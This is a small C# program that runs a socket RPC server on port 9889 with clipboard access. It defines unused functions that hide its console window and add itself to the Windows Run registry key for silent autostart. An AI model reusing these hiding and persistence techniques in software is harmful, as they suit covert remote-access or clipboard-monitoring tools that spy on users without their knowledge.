using System;
using RpcHandler.Server;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Tulpep.NotificationWindow;
using System.Drawing;
using RpcHandler.Message;
using System.Threading;

namespace TestXongXoa
{
    class Program
    {
        public const int HELLO = 1001;
        public const int ACCEPTED = 1002;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;

        // show window code
        const int SW_SHOW = 5;

        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }
        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (System.Exception ex)
            {
            }
        }
        static void Main(string[] args)
        {
            #region network
            ClipBoardHandler.Init();
            ServerImport serverImport = new ServerImport("TestXongXoa");
            ServerSocket server = new ServerSocket(9889, serverImport);
            server.Run();
            //int chosen = int.Parse(Console.ReadLine());

            //if (chosen == 0)
            //{
            //    ClipBoardHandler.Init();
            //    ServerImport serverImport = new ServerImport("TestXongXoa");
            //    ServerSocket server = new ServerSocket(9889, serverImport);
            //    server.Run();
            //}
            //else
            //{
            //    TestClient client = new TestClient("192.168.1.81", 9889);
            //    client.Ping();
            //    while (true)
            //    {
            //        while (client.GetAllResponse().Count != 0)
            //        {
            //            Response response = client.GetAllResponse().Dequeue();
            //            Console.WriteLine((string)response.Result);
            //        }
            //        //Thread th = new Thread(new ThreadStart(clearClipboardText));
            //        //th.SetApartmentState(ApartmentState.STA);
            //        //th.Start();
            //        //th.Join();
            //        Thread.Sleep(100);
            //    }
            //}
            #endregion
            System.Console.ReadKey();
        }
    }
}
